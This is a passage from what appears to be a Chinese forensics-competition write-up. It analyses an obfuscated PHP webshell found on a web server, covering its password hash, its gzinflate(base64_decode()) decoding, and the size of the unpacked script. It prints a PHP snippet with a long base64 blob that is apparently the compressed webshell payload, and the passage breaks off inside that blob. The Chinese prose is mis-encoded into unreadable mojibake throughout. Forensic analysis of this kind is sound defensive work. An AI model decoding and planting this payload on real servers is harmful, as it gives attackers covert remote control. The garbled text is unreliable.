(è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (3åˆ†)"></a>24. [å¡«ç©ºé¢˜] åœ¨ç½‘é¡µæœåŠ¡å™¨ä¸­ï¼Œè¿è¡Œå¯ç–‘æ¡£æ¡ˆéœ€è¦å¯†ç ï¼Œå…¶å¯†ç çš„å“ˆå¸Œå€¼(Hash Value)æ˜¯ç”šä¹ˆ? (è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (3åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-170628216.png" class="">  <p>åˆ†æä¸€ä¸‹è¿™ä¸²ä»£ç å…¶å®å°±æ˜¯é€šè¿‡æ‹¼æ¥ç”Ÿæˆcreate_funtiocnï¼Œåœ¨é€šè¿‡create_funtiocnæ¥è°ƒç”¨evalè¿è¡Œæœ¨é©¬<br>æˆ‘ä»¬ç›´æ¥å°†æ‹¼æ¥çš„evalæ”¹æˆechoçœ‹çœ‹è¿™ä¸ªæœ¨é©¬çš„é€»è¾‘</p><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-172033834.png" class="">  <p>åœ¨è¾“å‡ºçš„ä»£ç é‡Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªç™»é™†é€»è¾‘ï¼Œå…¶loginçš„md5å€¼å°±æ˜¯<code>$s_pass</code><br>0de664ecd2be02cdd54234a0d1229b43</p><h3 id="25-å•é€‰é¢˜-åœ¨ç½‘é¡µæœåŠ¡å™¨ä¸­ï¼Œå¯ç–‘æ¡£æ¡ˆçš„è¯‘ç å‡½æ•°æ˜¯ç”šä¹ˆ-2åˆ†"><a href="#25-å•é€‰é¢˜-åœ¨ç½‘é¡µæœåŠ¡å™¨ä¸­ï¼Œå¯ç–‘æ¡£æ¡ˆçš„è¯‘ç å‡½æ•°æ˜¯ç”šä¹ˆ-2åˆ†" class="headerlink" title="25. [å•é€‰é¢˜] åœ¨ç½‘é¡µæœåŠ¡å™¨ä¸­ï¼Œå¯ç–‘æ¡£æ¡ˆçš„è¯‘ç å‡½æ•°æ˜¯ç”šä¹ˆ? (2åˆ†)"></a>25. [å•é€‰é¢˜] åœ¨ç½‘é¡µæœåŠ¡å™¨ä¸­ï¼Œå¯ç–‘æ¡£æ¡ˆçš„è¯‘ç å‡½æ•°æ˜¯ç”šä¹ˆ? (2åˆ†)</h3><p>A. unzip_file(â€˜$x,$yâ€™)</p><p>B. gzdecode (base64_decode($x))</p><p>C. gzinflate(base64_decode($x))</p><p>D. ä»¥ä¸Šçš†å¦</p><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-172502601.png" class="">  <p>C é€šè¿‡gzinflate(base64_decode($x))æ¥å°†åé¢çš„ä»£ç è§£å¯†ï¼Œç„¶åç»™å‰é¢çš„evalè¿è¡Œï¼Œä»è€Œè¾¾æˆä»£ç çš„æ··æ·†</p><h3 id="26-å¡«ç©ºé¢˜-è§£å‹åçš„è„šæœ¬æ¡£çš„æ¡£æ¡ˆå¤§å°æ˜¯å¤šå°‘-è¯·ä»¥å­—èŠ‚åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3åˆ†"><a href="#26-å¡«ç©ºé¢˜-è§£å‹åçš„è„šæœ¬æ¡£çš„æ¡£æ¡ˆå¤§å°æ˜¯å¤šå°‘-è¯·ä»¥å­—èŠ‚åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-3åˆ†" class="headerlink" title="26. [å¡«ç©ºé¢˜] è§£å‹åçš„è„šæœ¬æ¡£çš„æ¡£æ¡ˆå¤§å°æ˜¯å¤šå°‘? (è¯·ä»¥å­—èŠ‚åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (3åˆ†)"></a>26. [å¡«ç©ºé¢˜] è§£å‹åçš„è„šæœ¬æ¡£çš„æ¡£æ¡ˆå¤§å°æ˜¯å¤šå°‘? (è¯·ä»¥å­—èŠ‚åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (3åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-174130549.png" class="">  <p>æˆ‘ç›´æ¥é€šè¿‡å°†evalæ”¹ä¸ºfile_put_contentæ¥å†™å…¥æ–‡ä»¶ï¼Œä½†æ˜¯è¿™æ ·å¾—åˆ°çš„ä¸ç­”æ¡ˆä¸åŒï¼ŒçŒœæµ‹å…¶è¯´è¯´çš„è„šæœ¬ä¸€ä¸ªæ˜¯é‚£ä¸²base64çš„ç¼–ç ã€‚ä½¿ç”¨base64è§£å¯†ç„¶åå†ä½¿ç”¨gzinflateæ¥å¡«å……å‹ç¼©å­—ç¬¦ï¼Œç„¶åå†™å…¥æ–‡ä»¶<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$Code</span> = <span class="string">&#x27;&quot;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